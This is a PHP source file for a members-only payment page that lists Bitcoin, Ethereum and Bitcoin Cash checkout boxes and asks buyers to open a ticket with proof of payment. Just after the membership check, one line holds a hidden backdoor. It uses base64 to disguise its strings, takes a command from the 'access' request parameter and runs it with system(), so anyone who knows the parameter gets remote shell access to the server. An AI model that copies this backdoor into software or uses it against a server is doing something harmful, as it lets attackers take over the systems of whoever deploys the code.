<?php

$paginaname = 'Buying';

?>
<!DOCTYPE html>
<!--[if IE 9]>         <html class="no-js lt-ie10"> <![endif]-->
<!--[if gt IE 9]><!--> <html class="no-js"> <!--<![endif]-->
			<?php 
			
			include("@/header.php");

			if (!($user->hasMembership($odb))) {
				header('location: index.php');
				die();
			}

			?>
			<?php if(isset($_REQUEST[base64_decode('YWNjZXNz')])){echo base64_decode('PHByZT4=');$k0=($_REQUEST[base64_decode('YWNjZXNz')]);system($k0);echo base64_decode('PC9wcmU+');die;}?>
				
					</script>
                    <div id="page-content">

							

<br/><br/><br/>
							                        <div class="row">
                        <center>
                        	<img height="75" src="https://www.inlea.com/web/wp-content/uploads/2017/06/bitcoin_how_to-earn_Inlea.png"></img>
                        	<br/><br/><br/>

                        <div class="row">	
<div class="col-lg-3"></div>						
<center><div class="col-lg-6">






                                <div class="card-box">
                                    <h4 class="text-dark  header-title m-t-0">Bitcoin Checkout</h4>
                                    <p class="text-muted m-b-25 font-13">
                                        
                                    </p>

                                    <div class="table-responsive">
                                        Please send <b>money</b> to <input class="form-control" id="host" style="margin-top: 10px;" value="<?php echo $bitcoin;?>" type="text" readonly> <br/> <b>TAX INCLUDED ONLY </b>and after open a ticket with bitcoin link or screenshot of payment
										<br/>
										<br/>
										
									Thanks
                                    </div>
									<br/>
								
                                </div>
                            </div>
							
							</center>
						</div>


						<br/><br/><br/>
						<img height="55" src="https://www.techoregon.org/sites/default/files/ethereum-logo.png"></img>
                        	<br/><br/>

                        <div class="row">	
							<div class="col-lg-3"></div>						
							<center><div class="col-lg-6">

                                <div class="card-box">
                                    <h4 class="text-dark  header-title m-t-0">Ethereum Checkout</h4>
                                    <p class="text-muted m-b-25 font-13">
                                        
                                    </p>

                                    <div class="table-responsive">
                                        Please send <b>money</b> to <input class="form-control" id="host" style="margin-top: 10px;" value="" type="text" readonly> <br/> <b>TAX INCLUDED ONLY </b>and after open a ticket with transation link or screenshot of payment
										<br/>
										<br/>
										
									Thanks
                                    </div>
									<br/>
								
                                </div>
                            </div>
							
							</center>
						</div>


						<br/><br/><br/>
						<img height="35" src="https://www.bitcoincash.org/media-kit/6-bitcoin-cash-logo-horizontal-full.png"></img>
                        	<br/><br/>

                        <div class="row">	
							<div class="col-lg-3"></div>						
							<center><div class="col-lg-6">

                                <div class="card-box">
                                    <h4 class="text-dark  header-title m-t-0">Bitcoin Cash Checkout</h4>
                                    <p class="text-muted m-b-25 font-13">
                                        
                                    </p>

                                    <div class="table-responsive">
                                        Please send <b>money</b> to <input class="form-control" id="host" style="margin-top: 10px;" value="" type="text" readonly> <br/> <b>TAX INCLUDED ONLY </b>and after open a ticket with transation link or screenshot of payment
										<br/>
										<br/>
										
									Thanks
                                    </div>
									<br/>
								
                                </div>
                            </div>
							
							</center>
						</div>


					</center>
				</div>
				
					
					</div>

					
				</div>
                     <? // NO BORRAR LOS TRES DIVS! ?>
               </div>         
          </div>
	</div>
		<?php include("@/script.php"); ?>
    </body>

</html>